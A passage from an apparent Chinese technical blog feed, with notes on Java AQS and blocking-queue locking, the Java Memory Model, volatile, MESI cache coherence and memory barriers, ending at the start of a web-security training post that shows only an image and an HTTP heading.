class="line">        <span class="keyword">if</span> ((interruptMode = checkInterruptWhileWaiting(node)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (acquireQueued(node, savedState) &amp;&amp; interruptMode != THROW_IE)</span><br><span class="line">        interruptMode = REINTERRUPT;</span><br><span class="line">    <span class="keyword">if</span> (node.nextWaiter != <span class="literal">null</span>) <span class="comment">// clean up if cancelled</span></span><br><span class="line">        unlinkCancelledWaiters();</span><br><span class="line">    <span class="keyword">if</span> (interruptMode != <span class="number">0</span>)</span><br><span class="line">        reportInterruptAfterWait(interruptMode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="title function_">fullyRelease</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">failed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">savedState</span> <span class="operator">=</span> getState();</span><br><span class="line">        <span class="keyword">if</span> (release(savedState)) &#123;</span><br><span class="line">            failed = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> savedState;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalMonitorStateException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (failed)</span><br><span class="line">            node.waitStatus = Node.CANCELLED;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">release</span><span class="params">(<span class="type">int</span> arg)</span> &#123;</span><br><span class="line">    <span class="comment">//最后调用这里释放锁！！！！！！！！！！！！！</span></span><br><span class="line">    <span class="keyword">if</span> (tryRelease(arg)) &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">h</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">if</span> (h != <span class="literal">null</span> &amp;&amp; h.waitStatus != <span class="number">0</span>)</span><br><span class="line">            unparkSuccessor(h);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而之后当消费者进行消费时，会触发<code>notFull.signal();</code></p>
<hr>
<p>如果队列不为满，成功放入元素后，需要通知<code>notEmpty</code>不为空的条件成立。</p>
<h2 id="出队方法"><a href="#出队方法" class="headerlink" title="出队方法"></a>出队方法</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">//初始化锁</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    <span class="comment">//尝试加锁，未加锁则被阻塞</span></span><br><span class="line">    lock.lockInterruptibly();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 如果队列为空</span></span><br><span class="line">        <span class="keyword">while</span> (count == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 等待notEmpty的条件，并且释放锁</span></span><br><span class="line">            notEmpty.await();</span><br><span class="line">        <span class="comment">// notEmpty条件成立则入队</span></span><br><span class="line">        <span class="keyword">return</span> dequeue();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">//解锁</span></span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出队</span></span><br><span class="line"><span class="keyword">private</span> E <span class="title function_">dequeue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// assert lock.getHoldCount() == 1;</span></span><br><span class="line">    <span class="comment">// assert items[takeIndex] != null;</span></span><br><span class="line">    <span class="keyword">final</span> Object[] items = <span class="built_in">this</span>.items;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="type">E</span> <span class="variable">x</span> <span class="operator">=</span> (E) items[takeIndex];</span><br><span class="line">    items[takeIndex] = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (++takeIndex == items.length)</span><br><span class="line">        takeIndex = <span class="number">0</span>;</span><br><span class="line">    count--;</span><br><span class="line">    <span class="keyword">if</span> (itrs != <span class="literal">null</span>)</span><br><span class="line">        itrs.elementDequeued();</span><br><span class="line">    <span class="comment">// 释放notFull条件</span></span><br><span class="line">    notFull.signal();</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样出队方法通过<code>lock()</code>和<code>unlock()</code>进行了同步，同时如果队列为空，当前线程需要释放锁，阻塞线程，并且等待<code>notEmpty</code>不为空的条件成立。</p>
<p>如果队列不为空，成功取出元素后，需要通知<code>notFull</code>不为满的条件成立。</p>
<p>基本的大致就是这样，但是更为有意思的是，它内部会使用条件等待队列</p>
<p>当某个线程不满足条件是，会从CLH队列进入条件等待队列，然后又会插回CLH队列。</p>
<p>慢慢的就依靠这个条件使得不同属性的线程获得锁。</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>并发编程及volatile详解</title>
    <url>/2021/04/20/2021/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="JMM模型"><a href="#JMM模型" class="headerlink" title="JMM模型"></a>JMM模型</h1><p>JMM模型的理解：</p>
<p>Java内存模型(Java Memory Model简称JMM)是一种抽象的概念，并不真实存在，它描述的是<strong>一组规则或规范</strong>，通过这组规范定义了程序中各个变量（包括实例字段，静态字段和构成数组对象的元素）的访问方式。</p>
<p>JVM运行程序的实体是线程，而每个线程创建时JVM都会为其创建一个工作内存(有些地方称为栈空间)，用于存储线程私有的数据，而Java内存模型中规定所有变量都存储在主内存，主内存是共享内存区域，所有线程都可以访问，但线程对变量的操作(读取赋值等)必须在工作内存中进行。</p>
<ul>
<li>首先要将变量从主内存拷贝的自己的工作内存空间</li>
<li>然后对变量进行操作，操作完成后再将变量写回主内存【不能直接操作主内存中的变量</li>
<li>工作内存中存储着主内存中的变量副本拷贝</li>
</ul>
<p>前面说过，工作内存是每个线程的私有数据区域，因此不同的线程间无法访问对方的工作内存，线程间的通信(传值)必须通过主内存来完成。</p>
<h2 id="JMM不同于JVM内存模型"><a href="#JMM不同于JVM内存模型" class="headerlink" title="JMM不同于JVM内存模型"></a>JMM不同于JVM内存模型</h2><p>JMM不同于JVM内存模型。恰当的来说，JMM描述的是一组规则，通过这组规则控制程序中各个变量在共享数据区域和私有数据区域的访问方式。</p>
<p>JMM是围绕原子性，有序性，可见性展开。</p>
<p>JMM于Java内存区域唯一相似点，都存在共享数据区域和私有数据区域。</p>
<p>在JMM中主内存属于共享数据区域【堆、方法区（元空间）</p>
<p>私有数据区域大致为【程序计数器、虚拟机栈、本地方法栈。</p>
<p>所以说，我们从逻辑上来看，存在主内存和各个线程私有的工作内存！</p>
<p>主内存：</p>
<p>主要存储的是Java实例对象，所有线程创建的实例对象都存放在主内存中，不管实例对象是成员变量还是方法中的本地变量（局部变量），当然也包括了共享的类信息、常量、静态变量。</p>
<p>由于是共享数据区域，多条线程对变量进行访问可能存在线程安全问题。</p>
<p>工作内存：</p>
<p>主要存储当前方法的所有本地变量信息(工作内存中存储着主内存中的变量副本拷贝)。</p>
<p>每个线程只能访问自己的工作内存，即线程中的本地变量对其它线程是不可见的，就算是两个线程执行的是同一段代码，它们也会各自在自己的工作内存中创建属于当前线程的本地变量，当然也包括了字节码行号指示器、相关Native方法的信息。</p>
<p>注意由于工作内存是每个线程的私有数据，线程间无法相互访问工作内存，因此存储在工作内存的数据不存在线程安全问题。</p>
<hr>
<p>根据JVM虚拟机规范主内存与工作内存的数据存储类型以及操作方式</p>
<p>对于一个实例对象中的成员方法而言，如果方法中包含本地变量是基本数据类型<code>（boolean,byte,short,char,int,long,float,double）</code>，将直接存储在工作内存的帧栈结构中，但倘若本地变量是引用类型，那么该变量的引用会存储在功能内存的帧栈中，而**对象实例将存储在主内存(**共享数据区域，堆)中。</p>
<p>但对于实例对象的成员变量，不管它是基本数据类型或者包装类型(Integer、Double等)还是引用类型，都会被存储到堆区。</p>
<p>至于static变量以及类本身相关信息将会存储在主内存中。需要注意的是，在主内存中的实例对象可以被多线程共享，倘若两个线程同时调用了同一个对象的同一个方法，那么两条线程会将要操作的数据拷贝一份到自己的工作内存中，执行完成操作后才刷新到主内存</p>
<h1 id="并发三大特性"><a href="#并发三大特性" class="headerlink" title="并发三大特性"></a>并发三大特性</h1><p>并发编程的可见性，原子性与有序性问题</p>
<h2 id="原子性"><a href="#原子性" class="headerlink" title="原子性"></a>原子性</h2><p>原子性指的是一个操作是不可中断的，即使是在多线程环境下，一个操作一旦开始就不会被其他线程影响。</p>
<h2 id="可见性"><a href="#可见性" class="headerlink" title="可见性"></a><strong>可见性</strong></h2><p>理解了JMM后，可见性容易了，可见性指的是当一个线程修改了某个共享变量的值，其他线程是否能够马上得知这个修改的值。</p>
<p>对于串行程序来说，可见性是不存在的，因为我们在任何一个操作中修改了某个变量的值，后续的操作中都能读取这个变量值，并且是修改过的新值。</p>
<p>但在多线程环境中可就不一定了，由于线程对共享变量的操作都是线程拷贝到各自的工作内存进行操作后才写回到主内存中的，这就可能存在一个线程A修改了共享变量x的值，还未写回主内存时</p>
<p>另外一个线程B又对主内存中同一个共享变量x进行操作，但此时A线程工作内存中共享变量x对线程B来说并不可见。</p>
<p>这种工作内存与主内存同步延迟现象就造成了可见性问题，另外指令重排以及编译器优化也可能导致可见性问题，通过前面的分析，我们知道无论是编译器优化还是处理器优化的重排现象，在多线程环境下，确实会导致程序轮序执行的问题，从而也就导致可见性问题。</p>
<h2 id="有序性"><a href="#有序性" class="headerlink" title="有序性"></a><strong>有序性</strong></h2><p>有序性是指对于单线程的执行代码，我们总是认为代码的执行是按顺序依次执行的，这样的理解并没有毛病，毕竟对于单线程而言确实如此。</p>
<p>但对于多线程环境，则可能出现乱序现象，因为程序编译成机器码指令后可能会出现指令重排现象，重排后的指令与原指令的顺序未必一致。</p>
<p>要明白的是，在Java程序中，倘若在本线程内，所有操作都视为有序行为，如果是多线程环境下，一个线程中观察另外一个线程，所有操作都是无序的，前半句指的是单线程内保证串行语义执行的一致性，后半句则指指令重排现象和工作内存与主内存同步延迟现象。</p>
<h2 id="关于JMM如何解决三大特性"><a href="#关于JMM如何解决三大特性" class="headerlink" title="关于JMM如何解决三大特性"></a>关于JMM如何解决三大特性</h2><p>原子性问题</p>
<p>我们可以使用 <code>synchronized</code>和<code>Lock</code> 实现原子性</p>
<p>使用锁可以保证任一时刻只有一个线程访问该代码块。</p>
<p>可见性问题</p>
<p>volatile关键字保证可见性。</p>
<p>当一个共享变量被volatile修饰时，它会保证修改的值立即被其他的线程看到，即修改的值立即更新到主存中，当其他线程需要读取时，它会去内存中读取新值。</p>
<p><strong>synchronized和Lock也可以保证可见性，因为它们可以保证任一时刻只有一个线程能访问共享资源，并在其释放锁之前将修改的变量刷新到内存中。</strong></p>
<p>很重要的点是<strong>synchronized和Lock</strong>可以保证可见性，这是因为在释放锁之前会把变量刷新到内存中。</p>
<p>有序性问题</p>
<p>在Java里面，可以通过volatile关键字来保证一定的“有序性”。</p>
<p>另外可以通过synchronized和Lock来保证有序性，很显然，synchronized和Lock保证每个时刻是有一个线程执行同步代码，相当于是让线程顺序执行同步代码，自然就保证了有序性。</p>
<p><strong>Java内存模型</strong>：</p>
<p>每个线程都有自己的工作内存（类似于前面的高速缓存）。</p>
<p>线程对变量的所有操作都必须在工作内存中进行，而不能直接对主存进行操作。</p>
<p>并且每个线程不能访问其他线程的工作内存。Java内存模型具备一些先天的“有序性”，即不需要通过任何手段就能够得到保证的有序性，这个通常也称为happens-before 原则。</p>
<p>如果两个操作的执行次序无法从happens-before原则推导出来，那么它们就不能保证它们的有序性，虚拟机可以随意地对它们进行重排序。</p>
<p><strong>指令重排序</strong>：</p>
<p>java语言规范规定JVM线程内部维持顺序化语义。</p>
<p>即只要程序的最终结果与它顺序化情况的结果相等，那么指令的执行顺序可以与代码顺序不一致，此过程叫指令的重排序。</p>
<p>指令重排序的意义是什么？JVM能根据处理器特性（CPU多级缓存系统、多核处理器等）适当的对机器指令进行重排序，使机器指令能更符合CPU的执行特性，最大限度的发挥机器性能。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/25/LDZYV9I5z8Wxoki.jpg"
                      alt="Screenshot_49.jpg"
                ></p>
<hr>
<h1 id="volatile解析"><a href="#volatile解析" class="headerlink" title="volatile解析"></a><strong>volatile解析</strong></h1><p>volatile是虚拟机提供的轻量级的同步机制。</p>
<p>一般是有两个作用</p>
<ul>
<li>保证可见性</li>
<li>禁止指令重排</li>
</ul>
<h1 id="volatile可见性"><a href="#volatile可见性" class="headerlink" title="volatile可见性"></a>volatile可见性</h1><p>关于volatile的可见性作用，我们必须意识到被volatile修饰的变量对所有线程总数立即可见的。</p>
<p>对volatile变量的所有写操作总是能立刻反应到其他线程中</p>
<p>这里就需要了解JVM内存模型了，分主内存和线程的工作内存。【注意JMM是一个规则。</p>
<h2 id="原子性-1"><a href="#原子性-1" class="headerlink" title="原子性"></a>原子性</h2><p>注意到volatile是不能保证原子性的！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VolatileVisibility</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">increase</span><span class="params">()</span>&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要知道<code>i++</code>不是一个原子操作，而是一般分为三个步骤，例如取值，+1，赋值。</p>
<h1 id="volatile可见性分析"><a href="#volatile可见性分析" class="headerlink" title="volatile可见性分析"></a>volatile可见性分析</h1><p>首先我们需要简单的明白一般的代码流程</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/26/FAuWP3hryfsjmVi.jpg"
                      alt="Screenshot_51.jpg"
                ></p>
<p>一个文件加载的所有流程一般为：</p>
<p>1、通过类加载器加载，在JVM的方法区中把类信息，静态变量，常量创建好，把Class对应类在堆中创建好。再通过后续操作，完成类加载。</p>
<p>2、进行方法调用时候，会在该线程虚拟机栈中创建栈帧，然后分析需要运行什么。</p>
<p>3、接着往底层走，会需要转化成对应的汇编，二进制，交付给CPU执行。</p>
<p>4、最后CPU计算完结果，写回到内存中。</p>
<h2 id="缓存一致性协议"><a href="#缓存一致性协议" class="headerlink" title="缓存一致性协议"></a>缓存一致性协议</h2><p>当有多核CPU有多个一级缓存是，如何保证各个缓存数据一致，不会出现混乱的情况？</p>
<h3 id="MESI协议缓存状态"><a href="#MESI协议缓存状态" class="headerlink" title="MESI协议缓存状态"></a><strong>MESI协议缓存状态</strong></h3><p>MESI 是指4种状态的首字母。每个Cache line有4个状态，可用2个bit表示，它们分别是：</p>
<p><strong>缓存行（Cache line）</strong>:缓存存储数据的单元。这个是CPU执行的最小单位。也就是说，每一次CPU拿去一个缓存行进去。</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>描述</th>
<th>监听任务</th>
</tr>
</thead>
<tbody><tr>
<td>M 修改 (Modified)</td>
<td>该Cache line有效，<strong>数据被修改了，和内存中的数据不一致</strong>，数据只存在于本Cache中。</td>
<td>缓存行必须时刻监听所有试图读该缓存行相对就主存的操作，这种操作必须在缓存将该缓存行写回主存并将状态变成S（共享）状态之前被延迟执行。</td>
</tr>
<tr>
<td>E 独享、互斥 (Exclusive)</td>
<td>该Cache line有效，数据和内存中的数据一致，数据只存在于本Cache中。</td>
<td>缓存行也必须监听其它缓存读主存中该缓存行的操作，一旦有这种操作，该缓存行需要变成S（共享）状态。</td>
</tr>
<tr>
<td>S 共享 (Shared)</td>
<td>该Cache line有效，数据和内存中的数据一致，数据存在于很多Cache中。</td>
<td>缓存行也必须监听其它缓存使该缓存行无效或者独享该缓存行的请求，并将该缓存行变成无效（Invalid）。</td>
</tr>
<tr>
<td>I 无效 (Invalid)</td>
<td><strong>该Cache line无效。</strong></td>
<td>无</td>
</tr>
</tbody></table>
<p><strong>注意：</strong></p>
<p><strong>对于M和E状态而言总是精确的，他们在和该缓存行的真正状态是一致的，而S状态可能是非一致的</strong>。</p>
<p>如果一个缓存将处于S状态的缓存行作废了，而另一个缓存实际上可能已经独享了该缓存行，但是该缓存却不会将该缓存行升迁为E状态，这是因为其它缓存不会广播他们作废掉该缓存行的通知，同样由于缓存并没有保存该缓存行的copy的数量，因此（即使有这种通知）也没有办法确定自己是否已经独享了该缓存行。</p>
<p>从上面的意义看来E状态是一种投机性的优化：</p>
<p>如果一个CPU想<strong>修改一个处于S状态的缓存行</strong>，总线事务需要将所有该缓存行的copy变成<strong>invalid状态</strong>，而修改E状态的缓存不需要使用总线事务。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/26/SGKZBP2le5ntQk1.jpg"
                      alt="Screenshot_52.jpg"
                ></p>
<p>总体来说，上图可以简易说明缓存一致性问题的解决方案</p>
<h3 id="MESI优化和他们引入的问题"><a href="#MESI优化和他们引入的问题" class="headerlink" title="MESI优化和他们引入的问题"></a><strong>MESI优化和他们引入的问题</strong></h3><hr>
<p>缓存的一致性消息传递是要时间的，这就使其切换时会产生延迟。当一个缓存被切换状态时其他缓存收到消息完成各自的切换并且发出回应消息这么一长串的时间中CPU都会等待所有缓存响应完成。可能出现的阻塞都会导致各种各样的性能问题和稳定性问题。</p>
<p><strong>CPU切换状态阻塞解决-存储缓存（Store Bufferes）</strong></p>
<p>比如你需要修改本地缓存中的一条信息，那么你必须将I（无效）状态通知到其他拥有该缓存数据的CPU缓存中，并且等待确认。等待确认的过程会阻塞处理器，这会降低处理器的性能。应为这个等待远远比一个指令的执行时间长的多。</p>
<p><strong>Store Bufferes</strong></p>
<p>为了避免这种CPU运算能力的浪费，Store Bufferes被引入使用。处理器把它想要写入到主存的值写到缓存，然后继续去处理其他事情。当所有失效确认（Invalidate Acknowledge）都接收到时，数据才会最终被提交。</p>
<p>这么做有两个风险</p>
<p><strong>Store Bufferes的风险</strong></p>
<p>第一、就是处理器会尝试从存储缓存（Store buffer）中读取值，但它还没有进行提交。这个的解决方案称为Store Forwarding，它使得加载的时候，如果存储缓存中存在，则进行返回。</p>
<p>第二、保存什么时候会完成，这个并没有任何保证。</p>
<hr>
<p>接下来我们再回到可见性分析来</p>
<p>我们了解了缓存一致性的概念和具体的思路，那么我们再看可见性似乎就有大概的思路了</p>
<p>接着用这张图</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/26/SGKZBP2le5ntQk1.jpg"
                      alt="Screenshot_52.jpg"
                ></p>
<p>主内存可以看作内存中的<code>X=0</code>，那么各个线程在工作内存中进行了拷贝。</p>
<p>而在本线程中对变量进行处理变化，如果变量进行了改变，那么需要通知到其他线程放弃他们手中的拷贝。</p>
<p>也就是图中的第六步—拷贝丢失。</p>
<p>同时这也说明了<strong>volatile不具备原子性</strong>：</p>
<p>当我们进行i++的时候，按照图中所示，A线程自加完毕，通知其他拷贝失效，需要从主内存中重新读取。</p>
<p>然而B线程已经把缓存中的变量读到CPU了，到达了<code>x++</code>的三步【取值，自加，赋值】中的第一步取值结束。</p>
<p>那么由于失效使得本次自加的得到结果不能准确了。</p>
<h1 id="volatile禁止指令重排"><a href="#volatile禁止指令重排" class="headerlink" title="volatile禁止指令重排"></a>volatile禁止指令重排</h1><p>volatile关键字另一个作用就是禁止指令重排优化，从而避免多线程环境下程序出现乱序执行的现象。</p>
<p>这里主要简单说明一下volatile是如何实现禁止指令重排优化的。先了解一个概念，内存屏障(Memory Barrier）。</p>
<h2 id="内存屏障"><a href="#内存屏障" class="headerlink" title="内存屏障"></a>内存屏障</h2><h3 id="硬件层的内存屏障"><a href="#硬件层的内存屏障" class="headerlink" title="硬件层的内存屏障"></a><strong>硬件层的内存屏障</strong></h3><p>Intel硬件提供了一系列的内存屏障，主要有： </p>
<ol>
<li><p>lfence，是一种Load Barrier 读屏障 </p>
</li>
<li><p>sfence, 是一种Store Barrier 写屏障 </p>
</li>
<li><p>mfence, 是一种全能型的屏障，具备ifence和sfence的能力 </p>
</li>
<li><p>Lock前缀，Lock不是一种内存屏障，但是它能完成类似内存屏障的功能。Lock会对CPU总线和高速缓存加锁，可以理解为CPU指令级的一种锁。它后面可以跟ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, XADD, and XCHG等指令。</p>
</li>
</ol>
<p>不同硬件实现内存屏障的方式不同，Java内存模型屏蔽了这种底层硬件平台的差异，由JVM来为不同的平台生成相应的机器码。 JVM中提供了四类内存屏障指令：</p>
<table>
<thead>
<tr>
<th>屏障类型</th>
<th>指令示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>LoadLoad</td>
<td>Load1; LoadLoad; Load2</td>
<td>保证load1的读取操作在load2及后续读取操作之前执行</td>
</tr>
<tr>
<td>StoreStore</td>
<td>Store1; StoreStore; Store2</td>
<td>在store2及其后的写操作执行前，保证store1的写操作已刷新到主内存</td>
</tr>
<tr>
<td>LoadStore</td>
<td>Load1; LoadStore; Store2</td>
<td>在stroe2及其后的写操作执行前，保证load1的读操作已读取结束</td>
</tr>
<tr>
<td>StoreLoad</td>
<td>Store1; StoreLoad; Load2</td>
<td>保证store1的写操作已刷新到主内存之后，load2及其后的读操作才能执行</td>
</tr>
</tbody></table>
<p>内存屏障，又称内存栅栏，是一个CPU指令，它的作用有两个。</p>
<p>一是保证特定操作的执行顺序</p>
<p>二是保证某些变量的内存可见性（利用该特性实现volatile的内存可见性）。</p>
<p>由于编译器和处理器都能执行指令重排优化。</p>
<p>如果在指令间插入一条Memory Barrier则会告诉编译器和CPU，不管什么指令都不能和这条Memory Barrier指令重排序，也就是说通过插入内存屏障禁止在内存屏障前后的指令执行重排序优化。</p>
<p>Memory Barrier的另外一个作用是强制刷出各种CPU的缓存数据，因此任何CPU上的线程都能读取到这些数据的最新版本。</p>
<p><strong>总之，volatile变量正是通过内存屏障实现其在内存中的语义</strong>，即可见性和禁止重排优化。下面看一个非常典型的禁止重排优化的例子DCL，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoubleCheckLock</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> DoubleCheckLock instance;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">DoubleCheckLock</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DoubleCheckLock <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//第一次检测</span></span><br><span class="line">        <span class="keyword">if</span> (instance==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//同步</span></span><br><span class="line">            <span class="keyword">synchronized</span> (DoubleCheckLock.class)&#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="comment">//多线程环境下可能会出现问题的地方</span></span><br><span class="line">                    instance = <span class="keyword">new</span>  <span class="title class_">DoubleCheckLock</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码一个经典的单例的双重检测的代码，这段代码在单线程环境下并没有什么问题，但如果在多线程环境下就可以出现线程安全问题。原因在于某一个线程执行到第一次检测，读取到的instance不为null时，instance的引用对象可能没有完成初始化。</p>
<blockquote>
<p>因为instance &#x3D; new DoubleCheckLock();可以分为以下3步完成(伪代码)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">memory = allocate();<span class="comment">//1.分配对象内存空间</span></span><br><span class="line">instance(memory);<span class="comment">//2.初始化对象</span></span><br><span class="line">instance = memory;<span class="comment">//3.设置instance指向刚分配的内存地址，此时instance！=null            </span></span><br></pre></td></tr></table></figure>

<p>由于步骤1和步骤2间可能会重排序，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">memory=allocate();<span class="comment">//1.分配对象内存空间</span></span><br><span class="line">instance=memory;<span class="comment">//3.设置instance指向刚分配的内存地址，此时instance！=null，但是对象还没有初始化完成！</span></span><br><span class="line">instance(memory);<span class="comment">//2.初始化对象</span></span><br></pre></td></tr></table></figure>

<p>由于步骤2和步骤3不存在数据依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种重排优化是允许的。</p>
<p>但是指令重排只会保证串行语义的执行的一致性(单线程)，但并不会关心多线程间的语义一致性。</p>
<p>所以当一条线程访问instance不为null时，由于instance实例未必已初始化完成，那么调用该实例方法却调用不成功,也就造成了线程安全问题。</p>
<p>那么该如何解决呢，很简单，我们使用volatile禁止instance变量被执行指令重排优化即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//禁止指令重排优化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> DoubleCheckLock instance;</span><br></pre></td></tr></table></figure>

<h2 id="volatile内存语义的实现"><a href="#volatile内存语义的实现" class="headerlink" title="volatile内存语义的实现"></a><strong>volatile内存语义的实现</strong></h2><p>前面提到过重排序分为编译器重排序和处理器重排序。为了实现volatile内存语义，JMM会分别限制这两种类型的重排序类型。</p>
<p>下图是JMM针对编译器制定的volatile重排序规则表。</p>
<table>
<thead>
<tr>
<th>第一个操作</th>
<th>第二个操作：普通读写</th>
<th>第二个操作：volatile读</th>
<th>第二个操作：volatile写</th>
</tr>
</thead>
<tbody><tr>
<td>普通读写</td>
<td>可以重排</td>
<td>可以重排</td>
<td>不可以重排</td>
</tr>
<tr>
<td>volatile读</td>
<td>不可以重排</td>
<td>不可以重排</td>
<td>不可以重排</td>
</tr>
<tr>
<td>volatile写</td>
<td>可以重排</td>
<td>不可以重排</td>
<td>不可以重排</td>
</tr>
</tbody></table>
<p>举例来说，第二行最后一个单元格的意思是：在程序中，当第一个操作为普通变量的读或写时，如果第二个操作为volatile写，则编译器不能重排序这两个操作。</p>
<p>从上图可以看出：</p>
<ul>
<li><ul>
<li>当第二个操作是volatile写时，不管第一个操作是什么，都不能重排序。这个规则确保volatile写之前的操作不会被编译器重排序到volatile写之后。</li>
<li>当第一个操作是volatile读时，不管第二个操作是什么，都不能重排序。这个规则确保volatile读之后的操作不会被编译器重排序到volatile读之前。</li>
<li>当第一个操作是volatile写，第二个操作是volatile读或写时，不能重排序。</li>
</ul>
</li>
</ul>
<p>为了实现volatile的内存语义，编译器在生成字节码时，会在指令序列中插入内存屏障来禁止特定类型的处理器重排序。对于编译器来说，发现一个最优布置来最小化插入屏障的总数几乎不可能。为此，JMM采取保守策略。下面是基于保守策略的JMM内存屏障插入策略。</p>
<ul>
<li><ul>
<li>·在每个volatile写操作的前面插入一个StoreStore屏障。</li>
<li>·在每个volatile写操作的后面插入一个StoreLoad屏障。</li>
<li>·在每个volatile读操作的后面插入一个LoadLoad屏障。</li>
<li>·在每个volatile读操作的后面插入一个LoadStore屏障。</li>
</ul>
</li>
</ul>
<p>上述内存屏障插入策略非常保守，但它可以保证在任意处理器平台，任意的程序中都能得到正确的volatile内存语义。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/04/26/cRZxfqjyhJzmIB8.jpg"
                      alt="Screenshot_53.jpg"
                ></p>
<p>上图中StoreStore屏障可以保证在volatile写之前，其前面的所有普通写操作已经对任意处理器可见了。这是因为StoreStore屏障将保障上面所有的普通写在volatile写之前刷新到主内存</p>
<hr>
<p>其他的类似做屏障也差不多是这样</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>合天培训（xss xxe uns FilInc ）</title>
    <url>/2020/02/26/CTFcomig/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200228172506395.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<h2 id="HTTP-x2F-HTTPS协议介绍"><a href="#HTTP-x2F-HTTPS协议介绍" class="headerlink" title="HTTP&#x2F;HTTPS协议介绍"></a>HTTP&#x2F;HTTPS协议介绍</h2><p>HTTP的工作流程</p>
<span id="more"></span>

